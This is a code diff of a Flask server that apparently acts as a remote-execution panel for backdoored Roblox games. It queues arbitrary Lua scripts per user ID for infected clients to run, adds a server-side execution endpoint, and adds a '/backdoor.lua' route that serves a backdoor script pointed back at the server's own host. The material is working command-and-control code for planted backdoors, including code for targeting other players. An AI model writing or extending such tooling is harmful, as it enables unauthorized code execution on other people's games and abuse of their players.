@@ -19,8 +19,28 @@ module_exists = lambda module: (os.path.exists(f"{module}/id.txt") or os.path.ex
 @executor.route('/api/execute', methods=['POST'])
 def web_execute():
     userid = request.args.get("userid")
-    script = request.data.decode("utf8")
-    
+
+    script = request.data.decode('utf8')
+
+    with open(f"{PATH}/static/assets/lua/convert.lua") as f:
+        convert = f.read()
+    with open(f"{PATH}/static/assets/lua/functions.lua") as f:
+        script = f"pcall(function()local plr = game:GetService('Players'):GetPlayerByUserId({userid}){convert} {f.read()} {script} end)"
+
+    if users.get(userid) != None:
+        users[userid].append(script)
+        return "OK"
+    return "NO CLIENT"
+
+@executor.route('/api/execute_ss', methods=['POST'])
+def web_execute_ss():
+    userid = request.args.get("userid")
+
+    script = request.data.decode('utf8')
+
+    with open(f"{PATH}/static/assets/lua/functions.lua") as f:
+        script = f"pcall(function(){f.read()} {script} end)"
+
     if users.get(userid) != None:
         users[userid].append(script)
         return "OK"
@@ -31,7 +51,7 @@ def web_execute_module():
     userid = request.args.get("userid")
     user = request.args.get("username")
     data = request.data.decode("utf8")
-    script = f"""local me = game:GetService("Players"):GetPlayerByUserId({userid})
+    script = f"""local plr = game:GetService("Players"):GetPlayerByUserId({userid})
     local target = "{user}"
     """
 
@@ -42,32 +62,9 @@ def web_execute_module():
                 script += f.read()
         elif os.path.exists(f"{module}/id.txt"):
             with open(f"{module}/id.txt") as f:
-                script += f"""targets = {{}}
-                
-                if target == "me" then
-                    table.insert(targets, me)
-                elseif target == "all" then
-                    targets = game:GetService("Players"):GetPlayers()
-                elseif target == "others" then
-                    targets = game:GetService("Players"):GetPlayers()
-                    table.remove(targets, table.find(targets, me))
-                else
-                    table.insert(targets, target)
-                end
-                
-                for _,target in pairs(targets) do
-                    if type(target) == "userdata" then
-                        target = target.Name
-                    end
-                    local m = require({f.read()})
-                    if type(m) == "table" then
-                    	for i,v in pairs(m) do
-                    		pcall(v, target)
-                    	end
-                    elseif type(m) == "function" then
-                    	pcall(m, target)
-                    end
-                end"""
+                script += f"local m = require({f.read()})\n"
+                with open(f"{PATH}/static/assets/lua/require.lua") as f:
+                    script += f.read()
 
     if users.get(userid) != None:
         users[userid].append(script)
@@ -88,6 +85,10 @@ def roblox_ping():
     
     return script
 
+@executor.route('/backdoor.lua', methods=['GET'])
+def backdoor_script():
+    return render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"))
+
 @executor.route('/api/players', methods=['GET', 'POST'])
 def roblox_player_ping():
     userid = request.args.get("userid")
@@ -96,7 +97,7 @@ def roblox_player_ping():
             players = users_players[userid]
 
             for player in players:
-                avatar = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userid}&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot").json()
+                avatar = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={players[player]['UserId']}&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot").json()
                 if avatar["data"][0]["state"] == "Completed":
                     players[player]["AvatarUrl"] = avatar["data"][0]["imageUrl"]
 
